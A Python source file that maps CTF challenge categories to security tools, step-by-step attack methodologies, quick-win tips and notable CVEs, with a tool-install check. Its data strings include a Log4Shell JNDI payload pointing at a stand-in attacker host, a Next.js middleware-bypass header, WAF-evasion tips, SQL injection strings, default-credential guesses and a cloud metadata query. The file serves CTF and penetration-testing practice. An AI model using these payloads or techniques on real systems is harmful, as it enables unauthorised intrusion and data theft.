"""CTF challenge-type to module/tool mapping with curated suggestions."""

from __future__ import annotations

import shutil
import sys
from pathlib import Path
from typing import Optional

_parent = str(Path(__file__).resolve().parent.parent)
if _parent not in sys.path:
    sys.path.insert(0, _parent)

from mcp_server.tools_db import ToolsDatabase  # noqa: E402

# Display name → tools_config.json registry name.
# Only needed when the user-facing name differs from the registry entry.
# Tools not listed here are assumed to match the registry name exactly.
TOOL_ALIASES: dict[str, str] = {
    # Case mismatches
    "cyberchef": "CyberChef",
    "responder": "Responder",
    "rsactftool": "RsaCtfTool",
    "seclists": "SecLists",
    "theharvester": "theHarvester",
    # Naming mismatches (display name → registry name)
    "jwt-tool": "jwt_tool",
    "afl++": "AFLplusplus",
    "upx": "upx-ucl",
    "exiftool": "libimage-exiftool-perl",
    "wireshark": "wireshark-common",
    "netcat": "netcat-openbsd",
    "wifite": "wifite2",
    "hashid": "hashid",
    "snow": "stegsnow",
    # Sub-components (display name → parent tool in registry)
    "photorec": "testdisk",
}

# Maps challenge type → description, relevant modules, and top tools with descriptions.
CTF_CATEGORY_MAP: dict[str, dict] = {
    "web": {
        "description": "Web exploitation — SQLi, XSS, SSRF, auth bypass, deserialization, prototype pollution",
        "modules": ["web", "recon", "networking"],
        "tools": [
            ("mitmproxy", "Intercepting HTTP/HTTPS proxy"),
            ("sqlmap", "Automatic SQL injection exploitation"),
            ("nikto", "Web server vulnerability scanner"),
            ("gobuster", "Directory/DNS/vhost brute-forcing"),
            ("ffuf", "Fast web fuzzer"),
            ("httpx", "Fast HTTP toolkit for probing"),
            ("nuclei", "Template-based vulnerability scanner"),
            ("whatweb", "Web technology fingerprinting"),
            ("feroxbuster", "Fast content discovery tool"),
            ("arjun", "HTTP parameter discovery"),
            ("jwt-tool", "JWT token testing and exploitation"),
            ("dalfox", "XSS parameter analysis and scanning"),
        ],
        "methodology": [
            "1. RECON: whatweb/httpx for tech stack + headers, ffuf/gobuster for hidden paths",
            "2. ENUMERATE: robots.txt, .git/HEAD, .env, backup files, API endpoints, JS bundles",
            "3. ANALYZE: Read JS source — grep for server action IDs, API keys, internal hostnames, "
            "hidden routes. Check /_next/static/<buildId>/_buildManifest.js for route map. "
            "Look for .hint files, env vars leaking internal service names",
            "4. EXPLOIT: SQLi (sqlmap), XSS (dalfox), SSRF, SSTI, deserialization, "
            "prototype pollution. If WAF blocks payloads: try string concat, alternate functions, "
            "encoding tricks",
            "5. ESCALATE: After initial access, check env vars and filesystem for internal "
            "service hostnames/ports, then pivot via SSRF or RCE to reach them",
        ],
        "quick_wins": [
            "Check robots.txt and /.git/HEAD",
            "Test ' OR 1=1-- in all input fields",
            "Try admin:admin, admin:password",
            "Read all JS bundles — search for hardcoded secrets, action IDs, internal URLs",
            "If Docker: check /.dockerenv, env vars, /etc/hosts for internal services",
        ],
        "notable_cves": [
            "CVE-2025-55182 — React2Shell: RCE via React Server Components Flight protocol. "
            "Craft multipart POST with prototype pollution payload (__proto__/constructor chain) "
            "to reach Function constructor. Hits any Next.js/React RSC endpoint with server actions. "
            "WAF bypass: split 'child_process' via string concat, use spawnSync instead of execSync",
            "CVE-2025-29927 — Next.js middleware bypass: header 'x-middleware-subrequest: "
            "middleware:middleware:middleware:middleware:middleware' skips all middleware checks. "
            "Exposes auth-protected routes. Affects Next.js <15.2.3, <14.2.25",
            "CVE-2021-44228 — Log4Shell: Java RCE via JNDI injection in log messages. "
            "Payload: ${jndi:ldap://attacker/a}. Test in User-Agent, headers, form fields",
            "CVE-2021-22204 — Exiftool RCE via DjVu metadata. Upload crafted image, "
            "triggers code execution when server runs exiftool on it",
            "CVE-2023-46747 — F5 BIG-IP auth bypass: unauthenticated RCE via /mgmt/tm/util/bash",
            "CVE-2019-11043 — PHP-FPM RCE via path_info: send \\n in URL to corrupt FPM buffer. "
            "Targets nginx + php-fpm with specific try_files/fastcgi_split_path_info config",
        ],
    },
    "crypto": {
        "description": "Cryptography — cipher analysis, RSA attacks, hash cracking, encoding",
        "modules": ["crypto", "cracking"],
        "tools": [
            ("z3-solver", "SMT solver for constraint problems"),
            ("rsactftool", "RSA attack toolkit"),
            ("hashcat", "Advanced hash cracking (GPU)"),
            ("john", "John the Ripper password cracker"),
            ("xortool", "XOR cipher analysis"),
            ("factordb-python", "Integer factorization database client"),
            ("hashid", "Hash type identification"),
            ("name-that-hash", "Hash identification tool"),
        ],
        "methodology": [
            "1. IDENTIFY: Use hashid/name-that-hash, check encoding (base64, hex, rot13)",
            "2. ANALYZE: Find key length (xortool), RSA parameters (n, e, c), cipher type",
            "3. ATTACK: RSA (RsaCtfTool, factordb), XOR (xortool), hash (hashcat/john)",
            "4. SOLVE: Use run_script with z3 for constraints, PyCryptodome for custom crypto",
            "5. VERIFY: Decrypt and validate output, check for nested encoding",
        ],
        "quick_wins": [
            "Try base64 -d, xxd -r, rot13 on ciphertext",
            "Check if RSA n is factorable via factordb",
            "Test common ciphers: Caesar, Vigenere, XOR with known plaintext",
            "Run hashcat/john with rockyou.txt on unknown hashes",
        ],
    },
    "pwn": {
        "description": "Binary exploitation — buffer overflows, ROP chains, format strings, heap exploits",
        "modules": ["pwn", "reversing"],
        "tools": [
            ("pwntools", "CTF framework for exploit development"),
            ("gdb", "GNU debugger (with pwndbg/GEF)"),
            ("pwndbg", "GDB plugin for exploit development"),
            ("ropper", "ROP gadget finder"),
            ("one_gadget", "One-shot execve gadget finder"),
            ("seccomp-tools", "Seccomp sandbox analysis"),
            ("boofuzz", "Network protocol fuzzer"),
            ("afl++", "Coverage-guided fuzzer"),
            ("checksec", "Binary security property checker"),
            ("ROPgadget", "ROP gadget search tool"),
        ],
        "methodology": [
            "1. RECON: checksec for protections (NX, PIE, canary, RELRO), file/readelf for type",
            "2. ANALYZE: objdump/radare2 for disassembly, find vulnerable function (gets, strcpy, printf)",
            "3. FIND PRIMITIVES: Buffer overflow offset (cyclic), format string leaks, heap bugs",
            "4. BUILD EXPLOIT: run_script with pwntools — ROP chain, shellcode, ret2libc, GOT overwrite",
            "5. EXPLOIT: Connect to target, send payload, handle interaction, capture the flag",
        ],
        "quick_wins": [
            "Run checksec to see which protections are missing",
            "Try cyclic(200) + core dump to find offset",
            "Check for format string: %p%p%p%p in input",
            "Look for win/flag function in symbols (nm/objdump)",
        ],
    },
    "reversing": {
        "description": "Reverse engineering — disassembly, decompilation, malware analysis, patching",
        "modules": ["reversing"],
        "tools": [
            ("ghidra", "NSA reverse engineering framework"),
            ("radare2", "RE framework and hex editor"),
            ("rizin", "Fork of radare2 with improved APIs"),
            ("binwalk", "Firmware analysis and extraction"),
            ("strace", "System call tracer"),
            ("ltrace", "Library call tracer"),
            ("upx", "UPX packer/unpacker"),
            ("angr", "Binary analysis framework"),
            ("uncompyle6", "Python bytecode decompiler"),
        ],
        "methodology": [
            "1. IDENTIFY: file, strings, readelf/objdump for file type, architecture, symbols",
            "2. STATIC ANALYSIS: Ghidra/radare2 decompile, find main/entry, map out functions",
            "3. DYNAMIC ANALYSIS: strace/ltrace for syscalls, gdb for breakpoints and stepping",
            "4. DECODE: Find anti-debug, unpack (UPX), decrypt strings, run_script for custom decode",
            "5. PATCH/SOLVE: Patch the binary or write keygen/solver with angr/z3",
        ],
        "quick_wins": [
            "Run strings and grep for flag{, CTF{, password, key",
            "Check if the binary is UPX-packed: upx -d binary",
            "Use ltrace to see strcmp/memcmp calls with expected input",
        ],
    },
    "forensics": {
        "description": "Digital forensics — disk/memory analysis, file carving, network forensics, timeline",
        "modules": ["forensics"],
        "tools": [
            ("volatility3", "Memory forensics framework"),
            ("autopsy", "Digital forensics GUI platform"),
            ("sleuthkit", "Filesystem forensics toolkit"),
            ("foremost", "File carving tool"),
            ("binwalk", "Firmware and file extraction"),
            ("exiftool", "Metadata extraction"),
            ("oletools", "Microsoft Office file analysis"),
            ("peepdf-3", "PDF analysis framework"),
            ("hachoir", "Binary stream analysis"),
            ("photorec", "File recovery / carving"),
            ("bulk-extractor", "Bulk data extraction"),
        ],
        "methodology": [
            "1. IDENTIFY: file, xxd, binwalk for file type and embedded data",
            "2. EXTRACT: binwalk -e, foremost, photorec for file carving",
            "3. ANALYZE: volatility3 for memory dumps, sleuthkit for disk images",
            "4. METADATA: exiftool, oletools, peepdf for document analysis",
            "5. RECONSTRUCT: run_script for custom parsers, timeline analysis, data recovery",
        ],
        "quick_wins": [
            "Run binwalk -e for automatic extraction of embedded files",
            "Check exiftool for hidden metadata and comments",
            "Use strings | grep -i flag on the entire file",
            "Try foremost for file carving from disk/memory dumps",
        ],
        "notable_cves": [
            "CVE-2021-22204 — Exiftool RCE via DjVu metadata: upload a crafted .djvu/.jpg "
            "that triggers command execution when the server parses metadata with exiftool. "
            "Common in file upload challenges where the server processes metadata",
            "CVE-2022-4510 — Binwalk path traversal RCE: crafted PFS filesystem in firmware "
            "image can write arbitrary files during extraction (binwalk <2.3.4)",
        ],
    },
    "stego": {
        "description": "Steganography — hidden data in images, audio, text, and network protocols",
        "modules": ["stego"],
        "tools": [
            ("steghide", "Hide/extract data in images and audio"),
            ("stegseek", "Fast steghide cracker"),
            ("zsteg", "PNG/BMP steganography detector"),
            ("stegsolve", "Image steganography analysis"),
            ("openstego", "Digital watermarking and data hiding"),
            ("exiftool", "Image metadata analysis"),
            ("stegoveritas", "Multi-tool stego analyzer"),
            ("snow", "Whitespace steganography tool"),
        ],
        "methodology": [
            "1. IDENTIFY: file, exiftool for file type and metadata, pngcheck for PNG validation",
            "2. VISUAL: stegsolve for bit-plane analysis, color channel manipulation",
            "3. EXTRACT: steghide extract, zsteg, binwalk for embedded data",
            "4. CRACK: stegseek with wordlist if steghide is password-protected",
            "5. CUSTOM: run_script for LSB extraction, audio spectrogram, custom stego algorithms",
        ],
        "quick_wins": [
            "Run exiftool for hidden comments and metadata",
            "Try steghide extract -sf image.jpg -p '' (empty password)",
            "Use zsteg on PNG/BMP for LSB data",
            "Check strings for embedded text or flag",
        ],
    },
    "misc": {
        "description": "Miscellaneous CTF — general tools, encoding, scripting, cracking",
        "modules": ["misc", "cracking"],
        "tools": [
            ("cyberchef", "Data transformation Swiss army knife"),
            ("hashcat", "Advanced GPU hash cracker"),
            ("john", "John the Ripper password cracker"),
            ("hydra", "Online brute-force tool"),
            ("crunch", "Wordlist generator"),
            ("arsenal-cli", "Cheatsheet tool for pentesters"),
            ("seclists", "Security wordlists collection"),
            ("patator", "Multi-purpose brute-forcer"),
        ],
        "methodology": [
            "1. IDENTIFY: file, strings, xxd to understand what you're working with",
            "2. DECODE: Try common encodings — base64, hex, URL, rot13, morse",
            "3. CRACK: hashcat/john with rockyou.txt, hydra for online brute-force",
            "4. SCRIPT: run_script for custom decode chains, brute-force logic",
            "5. COMBINE: Combine findings from multiple steps, think laterally",
        ],
        "quick_wins": [
            "Try CyberChef Magic function for automatic decoding",
            "Run base64 -d, xxd -r, and rot13 on unknown data",
            "Use john/hashcat with rockyou.txt on hashes",
        ],
    },
    "networking": {
        "description": "Network challenges — packet analysis, protocol exploitation, traffic manipulation",
        "modules": ["networking", "pwn", "enterprise"],
        "tools": [
            ("wireshark", "Network protocol analyzer (GUI)"),
            ("tshark", "CLI packet analyzer"),
            ("nmap", "Network scanner and service detection"),
            ("tcpdump", "Command-line packet capture"),
            ("scapy", "Packet manipulation framework"),
            ("netcat", "Network utility for reading/writing connections"),
            ("socat", "Multipurpose relay / socket tool"),
            ("masscan", "Fast port scanner"),
            ("responder", "LLMNR/NBT-NS/MDNS poisoner"),
            ("mitmproxy", "Intercepting HTTP/HTTPS proxy"),
        ],
        "methodology": [
            "1. METADATA: capinfos for file info, merge history, interface count, capture comments",
            "2. OVERVIEW: tshark -z io,phs for protocol hierarchy, identify unusual protocols",
            "3. ISOLATE: Split large PCAPs by interface/filter: tshark -Y 'filter' -w /tmp/subset.pcap",
            "4. ANALYZE: Follow TCP streams, extract files, check for covert channels (timing, ICMP, DNS)",
            "5. DECODE: run_script for timing analysis, payload reconstruction, protocol-specific parsing",
        ],
        "quick_wins": [
            "Run capinfos first — reveals merge history, capture comments, and hidden metadata",
            "Use tshark -z io,phs for instant protocol overview on any size PCAP",
            "Check for covert channels: unusual timing patterns, ICMP data, DNS TXT exfil",
            "Follow TCP streams: tshark -r file.pcap -z follow,tcp,ascii,0",
            "Check DNS queries in PCAP for exfiltrated data",
        ],
    },
    "wireless": {
        "description": "Wireless security — WiFi cracking, Bluetooth exploitation, SDR",
        "modules": ["wireless", "networking"],
        "tools": [
            ("aircrack-ng", "WiFi security auditing suite"),
            ("kismet", "Wireless network detector/sniffer"),
            ("bettercap", "MITM and network attack tool"),
            ("wifite", "Automated WiFi cracking"),
            ("reaver", "WPS brute-force attack tool"),
            ("fluxion", "WiFi social engineering tool"),
            ("bluez", "Bluetooth protocol stack"),
            ("hackrf", "SDR tools for HackRF"),
            ("gnuradio", "Signal processing framework"),
        ],
        "methodology": [
            "1. DISCOVER: airmon-ng for monitor mode, kismet for network scanning",
            "2. CAPTURE: airodump-ng for handshake capture, tcpdump for raw packets",
            "3. CRACK: aircrack-ng/hashcat on WPA handshake, reaver for WPS",
            "4. MITM: bettercap for ARP spoofing, mitmproxy for HTTP intercept",
            "5. ADVANCED: SDR with HackRF/GNURadio, Bluetooth with bluez",
        ],
        "quick_wins": [
            "Run wifite for automated WiFi attacks",
            "Check for WPS with wash/reaver",
            "Use aircrack-ng with rockyou.txt on captured handshake",
        ],
    },
    "osint": {
        "description": "Open Source Intelligence — social media, domain, email, and people reconnaissance",
        "modules": ["recon"],
        "tools": [
            ("sherlock-project", "Username search across social networks"),
            ("theharvester", "Email/subdomain/IP harvester"),
            ("recon-ng", "OSINT reconnaissance framework"),
            ("spiderfoot", "OSINT automation"),
            ("amass", "Attack surface mapping"),
            ("subfinder", "Subdomain discovery"),
            ("shodan", "Shodan CLI for internet-wide scanning"),
            ("holehe", "Email to social media account checker"),
            ("maigret", "Username search across 2500+ sites"),
            ("maltego-trx", "Maltego transform SDK"),
        ],
        "methodology": [
            "1. TARGET: Define scope — username, domain, email, organization",
            "2. ENUMERATE: sherlock/maigret for usernames, amass/subfinder for subdomains",
            "3. HARVEST: theHarvester for email/IP, holehe for account checking",
            "4. CORRELATE: Cross-reference findings, build relationship map",
            "5. DEEP DIVE: Shodan for exposed services, wayback machine for history",
        ],
        "quick_wins": [
            "Run sherlock/maigret on usernames for social media",
            "Use subfinder + httpx for fast subdomain scanning",
            "Check Shodan for exposed services on target IP",
            "Search wayback machine for old/deleted pages",
        ],
    },
    "cloud": {
        "description": "Cloud security — AWS/Azure/GCP exploitation, container escapes, IAM abuse",
        "modules": ["cloud", "containers", "recon"],
        "tools": [
            ("scoutsuite", "Multi-cloud security auditing"),
            ("prowler", "AWS/Azure/GCP security assessments"),
            ("pacu", "AWS exploitation framework"),
            ("cloudfox", "Cloud penetration testing"),
            ("trufflehog", "Secret scanning in code/cloud"),
            ("trivy", "Container vulnerability scanner"),
            ("kube-hunter", "Kubernetes penetration testing"),
            ("deepce", "Docker enumeration and escape"),
            ("cloudsplaining", "AWS IAM policy analyzer"),
        ],
        "methodology": [
            "1. ENUMERATE: Find cloud services, S3 buckets, IAM roles, metadata endpoints",
            "2. SCAN: prowler/scoutsuite for misconfiguration, trivy for container vulns",
            "3. SECRETS: trufflehog for hardcoded keys, check metadata API (169.254.169.254)",
            "4. EXPLOIT: pacu for AWS escalation, deepce for container escape",
            "5. PIVOT: Use discovered access to move laterally in the cloud environment",
        ],
        "quick_wins": [
            "Check metadata endpoint: curl http://169.254.169.254/latest/meta-data/",
            "Run trufflehog on git repo for exposed secrets",
            "Try public S3 bucket enumeration",
            "Check IAM policies for overprivileged roles",
        ],
        "notable_cves": [
            "CVE-2024-21626 — Leaky Vessels: container escape via /proc/self/fd race in runc. "
            "Attacker in container can overwrite host binaries",
            "CVE-2020-15257 — containerd host network namespace: containers with host network "
            "can access containerd shim API and escape to host",
        ],
    },
    "mobile": {
        "description": "Mobile security — Android/iOS app analysis, APK reversing, dynamic testing",
        "modules": ["mobile", "reversing", "forensics", "blueteam", "web"],
        "tools": [
            ("apktool", "APK reverse engineering"),
            ("jadx", "DEX to Java decompiler"),
            ("frida-tools", "Dynamic instrumentation toolkit"),
            ("mvt", "Mobile Verification Toolkit"),
            ("objection", "Runtime mobile exploration"),
            ("androguard", "Android app reverse engineering"),
            ("quark-engine", "Android malware scoring"),
            ("nuclei", "Vulnerability scanner with mobile templates"),
        ],
        "methodology": [
            "1. EXTRACT: apktool d app.apk, jadx for Java decompilation",
            "2. STATIC: Search for hardcoded secrets, API keys, endpoints in source code",
            "3. DYNAMIC: frida/objection for runtime hooking, SSL pinning bypass",
            "4. NETWORK: mitmproxy for API traffic, check for insecure endpoints",
            "5. EXPLOIT: Exploit discovered weaknesses — insecure storage, auth bypass, injection",
        ],
        "quick_wins": [
            "Run apktool d + grep -r 'password\\|secret\\|api_key' on unpacked APK",
            "Use jadx to read Java source code directly",
            "Check AndroidManifest.xml for exported activities/providers",
            "Try frida with objection for SSL pinning bypass",
        ],
    },
    "blockchain": {
        "description": "Blockchain security — smart contract auditing, EVM analysis, DeFi exploits",
        "modules": ["blockchain"],
        "tools": [
            ("slither-analyzer", "Solidity static analyzer"),
            ("mythril", "EVM bytecode security analyzer"),
            ("foundry", "Smart contract development toolkit"),
            ("solc-select", "Solidity compiler version manager"),
            ("echidna", "Ethereum smart contract fuzzer"),
        ],
        "methodology": [
            "1. ANALYZE: Read smart contract code, understand business logic",
            "2. STATIC: slither for automatic vulnerability scanning, mythril for EVM analysis",
            "3. TEST: foundry (forge test) for unit tests, echidna for fuzzing",
            "4. EXPLOIT: Write exploit contract with foundry, test against local fork",
            "5. VERIFY: Confirm vulnerability, document attack vector and impact",
        ],
        "quick_wins": [
            "Run slither for automatic detection of common weaknesses",
            "Check for reentrancy, integer overflow, access control issues",
            "Use foundry cast to interact with the contract directly",
        ],
    },
}

# Aliases for category names.
CATEGORY_ALIASES: dict[str, str] = {
    "re": "reversing",
    "rev": "reversing",
    "binary": "pwn",
    "exploitation": "pwn",
    "steganography": "stego",
    "network": "networking",
    "recon": "osint",
    "intelligence": "osint",
    "wifi": "wireless",
    "container": "cloud",
    "kubernetes": "cloud",
    "docker": "cloud",
    "android": "mobile",
    "ios": "mobile",
    "smart-contract": "blockchain",
    "solidity": "blockchain",
    "dfir": "forensics",
    "memory": "forensics",
}


def resolve_category(challenge_type: str) -> Optional[str]:
    """Resolve a challenge type string to a canonical category name."""
    normalized = challenge_type.lower().strip()
    if normalized in CTF_CATEGORY_MAP:
        return normalized
    return CATEGORY_ALIASES.get(normalized)


def _check_tool_installed(tool_name: str, tools_db: ToolsDatabase) -> tuple[bool, bool]:
    """Check if a tool is installed. Returns (installed, in_registry).

    Uses TOOL_ALIASES to map display names to registry names, and falls
    back to PATH check for tools not in the registry.
    """
    # Resolve display name to registry name
    registry_name = TOOL_ALIASES.get(tool_name, tool_name)

    # Check if it's in the registry
    in_registry = registry_name in tools_db.tools_by_name

    if in_registry:
        status = tools_db.check_installed(registry_name)
        if status["installed"]:
            return True, True

    # PATH check using the display name (the binary users actually run)
    if shutil.which(tool_name):
        return True, in_registry

    return False, in_registry


def suggest_for_ctf(challenge_type: str, tools_db: ToolsDatabase) -> dict:
    """Return tool suggestions for a CTF challenge type with install status.

    Returns dict with: category, description, modules, tools (with install status).
    """
    category = resolve_category(challenge_type)
    if not category:
        available = sorted(CTF_CATEGORY_MAP.keys())
        aliases = sorted(CATEGORY_ALIASES.keys())
        return {
            "error": f"Unknown challenge type: '{challenge_type}'",
            "available_categories": available,
            "available_aliases": aliases,
        }

    cat_info = CTF_CATEGORY_MAP[category]
    tools_with_status = []
    for tool_name, description in cat_info["tools"]:
        installed, in_registry = _check_tool_installed(tool_name, tools_db)
        entry = {
            "name": tool_name,
            "description": description,
            "installed": installed,
            "in_registry": in_registry,
        }
        # Add registry name if different from display name
        registry_name = TOOL_ALIASES.get(tool_name)
        if registry_name:
            entry["registry_name"] = registry_name
        tools_with_status.append(entry)

    installed_count = sum(1 for t in tools_with_status if t["installed"])

    result = {
        "category": category,
        "description": cat_info["description"],
        "modules": cat_info["modules"],
        "tools": tools_with_status,
        "methodology": cat_info.get("methodology", []),
        "quick_wins": cat_info.get("quick_wins", []),
        "summary": f"{installed_count}/{len(tools_with_status)} tools installed",
    }
    if "notable_cves" in cat_info:
        result["notable_cves"] = cat_info["notable_cves"]
    return result
